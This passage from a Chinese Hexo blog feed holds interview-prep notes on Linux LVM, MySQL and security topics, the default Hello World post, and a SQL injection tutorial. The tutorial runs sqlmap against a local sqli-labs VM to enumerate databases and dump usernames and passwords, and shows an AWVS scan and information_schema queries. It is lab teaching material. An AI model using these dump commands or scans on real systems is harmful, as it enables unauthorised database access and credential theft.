id=\"lvm宏杉吉利英伦\"><a class=\"markdownIt-Anchor\" href=\"#lvm宏杉吉利英伦\">#</a> LVM（宏杉，吉利英伦）</h4>\n<blockquote>\n<p>LVM 是逻辑盘卷管理（Logical Volume Manager）的简称，它是 Linux 环境下对磁盘分区进行管理的一种机制，LVM 是建立在硬盘和分区之上的一个逻辑层，来提高磁盘分区管理的灵活性。</p>\n<p>LVM 最大的特点就是可以对磁盘进行动态管理。因为逻辑卷的大小是可以动态调整的，而且不会丢失现有的数据。如果我们新增加了硬盘，其也不会改变现有上层的逻辑卷。作为一个动态磁盘管理机制，逻辑卷技术大大提高了磁盘管理的灵活性。</p>\n<p><strong>PV</strong>（Physical Volume）- 物理卷<br>\n物理卷在逻辑卷管理中处于最底层，它可以是实际物理硬盘上的分区，也可以是整个物理硬盘。<br>\n<strong>VG</strong>（Volumne Group）- 卷组<br>\n卷组建立在物理卷之上，一个卷组中至少要包括一个物理卷，在卷组建立之后可动态添加物理卷到卷组中。一个逻辑卷管理系统工程中可以只有一个卷组，也可以拥有多个卷组。<br>\n<strong>LV</strong>（Logical Volume）- 逻辑卷<br>\n逻辑卷建立在卷组之上，卷组中的未分配空间可以用于建立新的逻辑卷，逻辑卷建立后可以动态地扩展和缩小空间。系统中的多个逻辑卷可以属于同一个卷组，也可以属于不同的多个卷组</p>\n<p>PV 物理卷常用操作<br>\n pvcreate /dev/DEVICE: 创建 PV<br>\npvs：简要 PV 信息显示<br>\n pvdisplay：显示 PV 的详细信息<br>\n pvremove /dev/DEVICE: 移除 PV<br>\npvscan: 扫描系统中连接的所有硬盘，列出找到的物理卷列表</p>\n<p>VG 常用操作<br>\n vgcreate /dev/DEVICE: 创建 VG 卷组<br>\n vgs: 简要 VG 信息显示<br>\n vgextend：动态扩展 LVM 卷组，它通过向卷组中添加物理卷来增加卷组的容量<br>\n vgreduce：通过删除 LVM 卷组中的物理卷来减少卷组容量，不能删除 LVM 卷组中剩余的最后一个物理卷<br>\n vgdisplay：显示 VG 的详细信息<br>\n vgscan：查找系统中存在的 LVM 卷组，并显示找到的卷组列表<br>\n vgremove：删除卷组，其上的逻辑卷必须处于离线状态</p>\n<p>4、LV 常用操作<br>\n lvcreate : 用来创建 LVM 的逻辑卷<br>\n lvcreate -L #[mMgGtT] -n NAME VolumeGroup<br>\nlvs : 显示逻辑卷信息<br>\n lvscan：扫描当前系统中的所有逻辑卷，及其对应的设备文件<br>\n lvdisplay：显示逻辑卷属性<br>\n lvextend：可在线扩展逻辑卷空间<br>\n lvreduce：缩减逻辑卷空间，一般离线使用<br>\n lvremove：删除逻辑卷，需要处于离线（卸载）状态</p>\n<p><strong>缺点：</strong></p>\n<p>在从卷组中移除一个磁盘的时候必须使用 reducevg 命令（这个命令要求 root 权限，并且不允许在快照卷组中使用）。</p>\n<p>当卷组中的一个磁盘损坏时，整个卷组都会受到影响。</p>\n<p>因为加入了额外的操作，存储性能受到影响</p>\n<p>不能减小文件系统大小（受文件系统类型限制</p>\n</blockquote>\n<h3 id=\"10mysql相关\"><a class=\"markdownIt-Anchor\" href=\"#10mysql相关\">#</a> 10.mysql 相关</h3>\n<h4 id=\"mysql新建用户茄子\"><a class=\"markdownIt-Anchor\" href=\"#mysql新建用户茄子\">#</a> mysql 新建用户 (茄子)</h4>\n<blockquote>\n<ol>\n<li></li>\n</ol>\n<p>CREATE USER user_account IDENTIFIED BY password;  #CREATE USER dbadmin@localhost  IDENTIFIED BY ‘pwd123’;</p>\n<p>CREATE USER superadmin@’%’ IDENTIFIED BY ‘mypassword’; # 要允许用户帐户从任何主机连接，请使用百分比 ( <code>%</code> ) 通配符</p>\n<p>CREATE USER remote_user; #可以从任何主机连接到数据库服务器：</p>\n<ol start=\"2\">\n<li></li>\n</ol>\n<p>可以使用 INSERT 语句将用户的信息添加到 mysql.user 表中，但必须拥有对 mysql.user 表的 INSERT 权限。通常 INSERT 语句只添加 Host、User 和 authentication_string 这 3 个字段的值。</p>\n<p>INSERT INTO mysql.user(Host, User,  authentication_string, ssl_cipher, x509_issuer, x509_subject) VALUES (‘hostname’, ‘username’, PASSWORD(‘password’), ‘’, ‘’, ‘’);</p>\n<ol start=\"3\">\n<li></li>\n</ol>\n<p>GRANT SELECT ON*.* TO ‘test3’@localhost IDENTIFIED BY ‘test3’;</p>\n<p>4. 删除用户</p>\n<p>DROP USER ‘username’@‘host’;</p>\n<p>5. 更改密码</p>\n<p>SET PASSWORD FOR ‘username’@‘host’ = PASSWORD(‘newpassword’);</p>\n</blockquote>\n<h4 id=\"mysql查看权限茄子\"><a class=\"markdownIt-Anchor\" href=\"#mysql查看权限茄子\">#</a> mysql 查看权限 (茄子)</h4>\n<blockquote>\n<p>SHOW GRANTS FOR dbadmin@localhost;</p>\n<p>GRANT privileges ON databasename.tablename TO ‘username’@‘host’</p>\n<p>REVOKE privilege ON databasename.tablename FROM ‘username’@‘host’;</p>\n</blockquote>\n<h4 id=\"mysql备份中海达\"><a class=\"markdownIt-Anchor\" href=\"#mysql备份中海达\">#</a> mysql 备份 (中海达)</h4>\n<blockquote>\n<p>mysqldump -h 主机名 -P 端口 -u 用户名 -p 密码 –database 数据库名 &gt; 文件名.sql</p>\n</blockquote>\n<h4 id=\"mysql可靠中海达\"><a class=\"markdownIt-Anchor\" href=\"#mysql可靠中海达\">#</a> mysql 可靠 (中海达)</h4>\n<h4 id=\"acid汉得\"><a class=\"markdownIt-Anchor\" href=\"#acid汉得\">#</a> acid (汉得)</h4>\n<h4 id=\"mysql锁汉得\"><a class=\"markdownIt-Anchor\" href=\"#mysql锁汉得\">#</a> mysql 锁 (汉得)</h4>\n<h4 id=\"隔离级别汉得\"><a class=\"markdownIt-Anchor\" href=\"#隔离级别汉得\">#</a> 隔离级别 (汉得)</h4>\n<h4 id=\"主键外键区别主键索引区别汉得\"><a class=\"markdownIt-Anchor\" href=\"#主键外键区别主键索引区别汉得\">#</a> 主键，外键区别，主键，索引区别 (汉得)</h4>\n<p>10. 云计算相关问题</p>\n<p>使用过公有云吗，对公有云了解吗，中科还问了 OpenStack 了解吗 (中海达，茄子，中科曙光)</p>\n<p>ISSA，PAAS，SASS (吉利英伦)</p>\n<p>11. 有哪些负载均衡器 (茄子)</p>\n<p>12. 有哪些监控软件 (中海达，茄子)</p>\n<p>13.Nginx 了解吗 (中海达)</p>\n<p>Nginx 有哪些负载均衡模式 (长亭)</p>\n<p>Nginx 特性 (长亭)</p>\n<p>14. 连通性 /toubleshooting 问题</p>\n<p>14.1 判断和主机建立了连接的 IP (茄子)</p>\n<p>14.2 主机间是否连通，端口是否开放 (茄子)</p>\n<p>15. 怎么保证安全和可靠 (信锐)</p>\n<p>16.DNS 原理，端口 (特斯拉，长亭)</p>\n<p>递归和迭代区别 (这个目前还没人问，我闲着蛋疼自己问自己)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">（1）递归查询</span><br><span class=\"line\">递归查询是一种DNS 服务器的查询模式，在该模式下DNS 服务器接收到客户机请求，必须使用一个准确的查询结果回复客户机。如果DNS 服务器本地没有存储查询DNS 信息，那么该服务器会询问其他服务器，并将返回的查询结果提交给客户机。</span><br><span class=\"line\"></span><br><span class=\"line\">（2）迭代查询</span><br><span class=\"line\">DNS 服务器另外一种查询方式为迭代查询，DNS 服务器会向客户机提供其他能够解析查询请求的DNS 服务器地址，当客户机发送查询请求时，DNS 服务器并不直接回复查询结果，而是告诉客户机另一台DNS 服务器地址，客户机再向这台DNS 服务器提交请求，依次循环直到返回查询的结果为止。</span><br></pre></td></tr></table></figure>\n<p>17. 二层相关</p>\n<p>stp 作用 (宏杉)</p>\n<p>super vlan (宏杉)</p>\n<p>stp 选举 (中科闻歌)</p>\n<p>18 链路聚合 (宏杉，中科曙光)</p>\n<p>19. 防火墙硬件实现，IPSEC 了解过吗 (中科曙光)</p>\n<p>防火墙用过吗，啥型号的，A 访问 B 时在防火墙配置单向还是双向，如果是交换机，需要配置单向还是双向 (中科闻歌)</p>\n<p>20. 项目题</p>\n<p>小型星星网络</p>\n<p>1. 确定网络设备</p>\n<p>2. 交换机设备和接口数量，交换机选型 (吞吐量)</p>\n<p>中型</p>\n<p>大型</p>\n<p>ping 丢包</p>\n<h2 id=\"0x02-安全岗总结\"><a class=\"markdownIt-Anchor\" href=\"#0x02-安全岗总结\">#</a> 0x02 安全岗总结</h2>\n<p>1. 反序列化相关</p>\n<p>PHP 反序列化的魔法方法，wakeup 绕过 (理想)</p>\n<p>shrio 反序列化，fastjson 反序列化，struct S062 (深信服)</p>\n<p>java 反序列化 (深信服)</p>\n<p>2. 逻辑漏洞类</p>\n<p>逻辑漏洞任意邮箱注册怎么修复 (理想)</p>\n<p>登录框有啥漏洞 (安天)</p>\n<p>3.XSS 类</p>\n<p>富文本编辑器 XSS 怎么解决 (理想)</p>\n<p>说说看 xss (长亭)</p>\n<p>4.SQL 注入类</p>\n<p>SQL 注入怎么防，PDO 在 order by 场景怎么防 (理想)</p>\n<p>sql 注入有几种 (深信服)</p>\n<p>union select 后面可以加 insert 吗，union select 叫啥名字 (深信服)</p>\n<p>怎么通过数据库获取系统权限，mysql，sqlserver (深信服)</p>\n<p>mysql 写 shell 命令 (深信服)</p>\n<p>堆叠注入原理，和 union select 有啥区别 (深信服)</p>\n<p>报错注入语句 (深信服)</p>\n<p>时间盲注原理，语句 (深信服)</p>\n<p>5. 入侵排查怎么查，netstat 怎么看，怎么找进程 (理想，安天)</p>\n<p>6.discuz 漏洞复现 (可能因为我简历里写了)(理想)</p>\n<p>7.cookie 对单个参数长度限制 (理想)</p>\n<p>8. 出现 0day，资产排查 (理想)</p>\n<p>10. 文件上传 shell 成功但不能连接，怎么办 (深信服)</p>\n<p>11. 内网渗透相关</p>\n<p>内网隧道怎么搭，earthworm 三种模式 (深信服)</p>\n<p>内网横向 (深信服)</p>\n<p>wmin 端口，横向之后啥权限 (深信服)</p>\n<p>12. 权限维持 (深信服)</p>\n<p>13.waf 是干啥的，哪一层的 (长亭)</p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/10/16/hello-world/",
            "url": "http://example.com/2022/10/16/hello-world/",
            "title": "Hello World",
            "date_published": "2022-10-16T02:45:40.741Z",
            "content_html": "<p>Welcome to <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvLw==\">Hexo</span>! This is your very first post. Check <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv\">documentation</span> for more info. If you get any problems when using Hexo, you can find the answer in <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=\">troubleshooting</span> or you can ask me on <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==\">GitHub</span>.</p>\n<h2 id=\"quick-start\"><a class=\"markdownIt-Anchor\" href=\"#quick-start\">#</a> Quick Start</h2>\n<h3 id=\"create-a-new-post\"><a class=\"markdownIt-Anchor\" href=\"#create-a-new-post\">#</a> Create a new post</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s\">Writing</span></p>\n<h3 id=\"run-server\"><a class=\"markdownIt-Anchor\" href=\"#run-server\">#</a> Run server</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=\">Server</span></p>\n<h3 id=\"generate-static-files\"><a class=\"markdownIt-Anchor\" href=\"#generate-static-files\">#</a> Generate static files</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s\">Generating</span></p>\n<h3 id=\"deploy-to-remote-sites\"><a class=\"markdownIt-Anchor\" href=\"#deploy-to-remote-sites\">#</a> Deploy to remote sites</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s\">Deployment</span></p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/03/16/SQL%E6%B3%A8%E5%85%A5/",
            "url": "http://example.com/2022/03/16/SQL%E6%B3%A8%E5%85%A5/",
            "title": "SQL injection",
            "date_published": "2022-03-16T05:38:45.000Z",
            "content_html": "<h1 id=\"sql注入\"><a class=\"markdownIt-Anchor\" href=\"#sql注入\">#</a> SQL 注入</h1>\n<h3 id=\"1sqli-labs-master-安装\"><a class=\"markdownIt-Anchor\" href=\"#1sqli-labs-master-安装\">#</a> 1.sqli-labs-master 安装</h3>\n<p>下面在 linux 中安装，虚拟机地址为 192.168.1.155，端口号为 18888，使用宝塔面板</p>\n<h4 id=\"1将sqli-labs-master移动到网站根目录下解压\"><a class=\"markdownIt-Anchor\" href=\"#1将sqli-labs-master移动到网站根目录下解压\">#</a> 1. 将 sqli-labs-master 移动到网站根目录下，解压</h4>\n<p><code>unzip sqli-labs-master</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639469835321-5363494e-a8b7-4796-99a0-97f475cef370.png\" alt=\"img\"></p>\n<h4 id=\"2修改配置文件配合文件为sqlisql-connectionsdb-credsinc\"><a class=\"markdownIt-Anchor\" href=\"#2修改配置文件配合文件为sqlisql-connectionsdb-credsinc\">#</a> 2. 修改配置文件，配合文件为： <code>sqli/sql-connections/db-creds.inc</code></h4>\n<p><code>vim sqli/sql-connections/db-creds.inc</code></p>\n<p>数据库用户名和密码在宝塔面板中可以修改</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639469904204-6c29948a-2cdc-4f11-8e01-58f8ed2dbe83.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639469999346-dca351bf-b5d0-4a51-9ff1-dab559edf120.png\" alt=\"img\"></p>\n<h4 id=\"3浏览器打开输入对应的文件路径安装数据库如果第二步有错此步将不能正常执行\"><a class=\"markdownIt-Anchor\" href=\"#3浏览器打开输入对应的文件路径安装数据库如果第二步有错此步将不能正常执行\">#</a> 3. 浏览器打开，输入对应的文件路径，安装数据库，如果第二步有错，此步将不能正常执行</h4>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639470033800-7e58d43a-1835-4303-906c-05a0d03dd762.png\" alt=\"img\"></p>\n<h4 id=\"4验证安装完成后即可按到如下界面\"><a class=\"markdownIt-Anchor\" href=\"#4验证安装完成后即可按到如下界面\">#</a> 4. 验证安装完成后，即可按到如下界面</h4>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639470107086-065656d0-7044-4c09-9323-5e799f726534.png\" alt=\"img\"></p>\n<h3 id=\"2sqlmap-安装与使用\"><a class=\"markdownIt-Anchor\" href=\"#2sqlmap-安装与使用\">#</a> 2.sqlmap 安装与使用</h3>\n<h4 id=\"1kali联网\"><a class=\"markdownIt-Anchor\" href=\"#1kali联网\">#</a> 1.kali 联网</h4>\n<p>选择桥接时，只需要将虚拟机和物理主机 ip 置于一个网段中</p>\n<p>如果不能联网，修改 <code>/etc/network/interfaces</code>   ，设置 ip，网关，掩码</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">source</span> /etc/network/interfaces.d/*</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># The loopback network interface**</span></span><br><span class=\"line\">auto lo</span><br><span class=\"line\">iface lo inet loopback</span><br><span class=\"line\"></span><br><span class=\"line\">auto eth0</span><br><span class=\"line\"></span><br><span class=\"line\">iface eth0 inet static</span><br><span class=\"line\">address 192.168.0.66</span><br><span class=\"line\">gateway 192.168.1.1</span><br><span class=\"line\">netmask 255.255.254.0</span><br></pre></td></tr></table></figure>\n<h4 id=\"2修改dns-etcresolvconf\"><a class=\"markdownIt-Anchor\" href=\"#2修改dns-etcresolvconf\">#</a> 2. 修改 DNS，  <code>/etc/resolv.conf</code></h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nameserver 8.8.8.8</span><br><span class=\"line\">nameserver 114.114.114.114</span><br><span class=\"line\">search localdomain</span><br></pre></td></tr></table></figure>\n<h4 id=\"3重启网络服务\"><a class=\"markdownIt-Anchor\" href=\"#3重启网络服务\">#</a> 3. 重启网络服务</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/etc/init.d/networking restart</span><br><span class=\"line\"></span><br><span class=\"line\">service networking restart </span><br></pre></td></tr></table></figure>\n<h4 id=\"4sqlmap使用\"><a class=\"markdownIt-Anchor\" href=\"#4sqlmap使用\">#</a> 4.sqlmap 使用</h4>\n<p>下载：Github：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NxbG1hcHByb2plY3Qvc3FsbWFw\">https://github.com/sqlmapproject/sqlmap</span></p>\n<h4 id=\"5sqlmap支持的注入技术\"><a class=\"markdownIt-Anchor\" href=\"#5sqlmap支持的注入技术\">#</a> 5.SQLMAP 支持的注入技术</h4>\n<p>​\t基于布尔的盲注：根据返回页面判断条件真假的注入。</p>\n<p>​\t基于时间的盲注：不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语 句是否执行（即页面返回时间是否增加）来判断。</p>\n<p>​\t基于报错的注入：页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>\n<p>​\t基于联合查询的注入：可以使用 UNION 的情况下的注入。</p>\n<p>​\t堆查询注入：同时执行多条语句的注入。</p>\n<h4 id=\"6sqlmap支持的数据库类型\"><a class=\"markdownIt-Anchor\" href=\"#6sqlmap支持的数据库类型\">#</a> 6.SQLMAP 支持的数据库类型</h4>\n<p>​\t主要包括一些关系型数据库（ RMDBS ） ， 如 MySQL 、Oracle 、PostgreSQL 、 Microsoft SQL Server 、Microsoft Access 、IBM DB2 、SQLite 、Firebird 、 Sybase、SAP MaxDB、Informix、HSQLDB 等</p>\n<h4 id=\"7sqlmap用法以下用windows演示\"><a class=\"markdownIt-Anchor\" href=\"#7sqlmap用法以下用windows演示\">#</a> 7.sqlmap 用法 (以下用 Windows 演示)</h4>\n<h4 id=\"71对于get请求爆破方式\"><a class=\"markdownIt-Anchor\" href=\"#71对于get请求爆破方式\">#</a> 7.1 对于 get 请求爆破方式</h4>\n<p>1.sqlmap -u URL</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x\">http://192.168.1.4:18888/sqli/Less-1/?id=1</span></p>\n<p>判断可注入的参数</p>\n<p>判断可以用哪种 SQL 注入技术来注入</p>\n<p>识别出所有存在的注入类型</p>\n<p>尝试去判定数据库版本、开发语言、操作系统版本</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213182954882.png\" alt=\"image-20220213182954882\"></p>\n<p>2.sqlmap -u URL --current-db 获得数据库名</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x\">http://192.168.1.4:18888/sqli/Less-1/?id=1</span> --current-db</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183117274.png\" alt=\"image-20220213183117274\"></p>\n<p>3.sqlmap -u URL -D database --tables  获得数据库中表名</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x\">http://192.168.1.4:18888/sqli/Less-1/?id=1</span> -D security --tables</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183308240.png\" alt=\"image-20220213183308240\"></p>\n<p>4.sqlmap -u URL -D database -T tables --columns 获得表中字段名</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x\">http://192.168.1.4:18888/sqli/Less-1/?id=1</span> -D security -T users --columns</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183454058.png\" alt=\"image-20220213183454058\"></p>\n<p>5.sqlmap -u URL -D database -T users -C name1,name2,name3 --dump 获取每个字段中的数据</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x\">http://192.168.1.4:18888/sqli/Less-1/?id=1</span> -D security -T users -C password,username --dump</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183651064.png\" alt=\"image-20220213183651064\"></p>\n<h4 id=\"72对于post请求爆破方式\"><a class=\"markdownIt-Anchor\" href=\"#72对于post请求爆破方式\">#</a> 7.2 对于 post 请求爆破方式</h4>\n<p>1. 保存文件方式  sqlmap -r x.txt</p>\n<p>先使用 BurpSuite 抓包，将获取内容保存到指定文件，下面将文件保存到 E://1.txt</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span>  -r E:\\1.txt</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183936861.png\" alt=\"image-20220213183936861\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213184049162.png\" alt=\"\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213184622656.png\" alt=\"image-20220213184622656\"></p>\n<p>2. 手动输入 post 参数方式  sqlmap -u URL --data “”</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span>  -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xNy9pbmRleC5waHA=\">http://192.168.1.4:18888/sqli/Less-17/index.php</span> --data “uname=admin&amp;passwd=admin&amp;submit=Submit” --current-db</p>\n<p>3. 自动搜索 post 参数方式</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span>  -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xNy9pbmRleC5waHA=\">http://192.168.1.4:18888/sqli/Less-17/index.php</span> --forms</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213185639194.png\" alt=\"image-20220213185639194\"></p>\n<h4 id=\"73对于一些较难注入的场景\"><a class=\"markdownIt-Anchor\" href=\"#73对于一些较难注入的场景\">#</a> 7.3 对于一些较难注入的场景</h4>\n<p>通过指定 level 设置，一共包含五个等级</p>\n<p>level=2 http cookie 会测试</p>\n<p>level=3 http user-agent/referer 头会测试</p>\n<p>level=5 包含的 payload 最多，会自动破解出 cookie、XFF 等头部注入，相对应他的速度也比较慢。</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x\">http://192.168.1.4:18888/sqli/Less-1/?id=1</span> level 5</p>\n<h3 id=\"使用awvs-进行sql-inject扫描\"><a class=\"markdownIt-Anchor\" href=\"#使用awvs-进行sql-inject扫描\">#</a> 使用 AWVS 进行 sql inject 扫描</h3>\n<p>安装过程不在描述，使用 add target 输入要扫描的地址</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305141924499.png\" alt=\"image-20220305141924499\"></p>\n<p>选择扫描速度</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142112656.png\" alt=\"image-20220305142112656\"></p>\n<p>设置 user-agent 伪装</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142142802.png\" alt=\"image-20220305142142802\"></p>\n<p>可以联动被动扫描器如 xray 进行多次扫描，</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142228843.png\" alt=\"image-20220305142228843\"></p>\n<p>选择 scan</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142305286.png\" alt=\"image-20220305142305286\"></p>\n<p>发现 sql 注入，存在盲注</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142353893.png\" alt=\"image-20220305142353893\"></p>\n<p>点击可以查看详细信息和扫描过程</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142445896.png\" alt=\"image-20220305142445896\"></p>\n<h3 id=\"3sql注入基础\"><a class=\"markdownIt-Anchor\" href=\"#3sql注入基础\">#</a> 3.SQL 注入基础</h3>\n<h4 id=\"31sql前置知识\"><a class=\"markdownIt-Anchor\" href=\"#31sql前置知识\">#</a> 3.1SQL 前置知识</h4>\n<p>1.mysql 查询方式</p>\n<p>mysql 注入主要关注 MYSQL 系统数据库 <code>information_schema</code> ，关注系统数据库的表 <code>columns</code>  和 <code>schemata</code>  表以及 <code>tables</code>  表</p>\n<p><code>SCHEMATA</code>  表：提供了关于数据库的信息</p>\n<p>desc information_schema.schemata;</p>\n<p>select distinct schema_name from schemata;</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213191251636.png\" alt=\"image-20220213191251636\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213191345456.png\" alt=\"image-20220213191345456\"></p>\n<p><code>COLUMNS</code>  表：给出了表中的列信息</p>\n<p>desc information_schema.columns;</p>\n<p>select distinct column_name from information_schema.columns</p>\n<p><code>TABLES</code>  表：给出了关于数据库中的表的信息</p>\n<p>desc information_schema.tables;</p>\n<p>select distinct table_name from information_schema.tables;</p>\n<p><strong>即可以使用的查询语句为</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.select distinct schema_name from schemata; 获取数据库名(或使用函数select database();)</span><br><span class=\"line\"></span><br><span class=\"line\">2.select table_name from information_schema.tables where table_schema=&#x27;security&#x27;; 获取表名</span><br><span class=\"line\"></span><br><span class=\"line\">3.select column_name  from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;;  获取列名</span><br><span class=\"line\"></span><br><span class=\"line\">4.select username from users;  获取数据</span><br></pre></td></tr></table></figure>\n<p>2.mysql 函数</p>\n<p>常用的 mysql 函数有：</p>\n<p><code>user()</code>  用户名</p>\n<p><code>database()</code>  数据库名</p>\n<p><code>version()</code>  mysql 数据库版本</p>\n<p><code>load_file()</code>  mysql 读取本地文件的函数</p>\n<p><code>@@datadir</code>   数据库路径</p>\n<p>3.sql 常用注释</p>\n<p><img 